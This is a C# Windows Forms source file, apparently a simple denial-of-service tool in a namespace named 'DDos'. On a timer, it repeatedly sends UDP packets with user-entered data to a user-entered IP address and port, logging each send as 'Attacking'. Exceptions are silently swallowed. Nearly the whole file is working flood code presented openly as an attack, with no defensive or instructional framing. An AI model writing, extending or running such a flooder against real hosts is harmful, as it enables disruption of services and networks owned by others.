using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;


namespace DDos
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                listBox1.Items.Add("Attacking" + textBox1.Text + " With data ");
                UdpClient udpClient;
                udpClient = new UdpClient();
                IPAddress ip;
                ip = IPAddress.Parse(textBox1.Text);
                udpClient.Connect(ip, Int32.Parse(textBox2.Text));
                Byte[] bytedata = Encoding.ASCII.GetBytes(textBox3.Text);
                udpClient.Send(bytedata, bytedata.Length);

            }
            catch(Exception )
            {
                
            }
        }
    }
}
